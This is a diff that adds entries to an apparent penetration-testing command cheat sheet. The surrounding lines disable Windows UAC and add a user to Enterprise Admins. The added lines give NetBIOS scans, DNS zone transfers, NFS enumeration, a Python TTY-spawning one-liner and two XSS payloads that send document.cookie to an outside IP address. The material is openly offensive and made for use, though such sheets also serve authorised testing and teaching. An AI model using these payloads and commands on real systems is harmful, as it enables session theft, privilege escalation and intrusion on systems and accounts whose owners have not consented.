@@ -127,8 +127,28 @@ net group "Enterprise Admins" <username> /add /domain
 # Disable UAC (Windows)
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
+# NetBIOS Scan a Range
+nbtscan -r 10.0.0.0/24
 
+# Generate self-signed SSL/TLS Cert
+openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/ssl/certs/server.crt -keyout /etc/ssl/private/server.key
 
+# Cross Site Scripting (XSS) Payloads 
+<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
+<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
+
+# Spawn TTY From Python
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# DNS Zone Transfer
+dig @<nameserver> domain.com -t axfr
+host -l domain.com <nameserver>
+
+# Remote NFS Mount Listing
+rpcinfo -p 10.0.0.1
+showmount -e 10.0.0.1
+
+# TODO: Add WMI queries and netsh/netsh forwarding
 
 
 
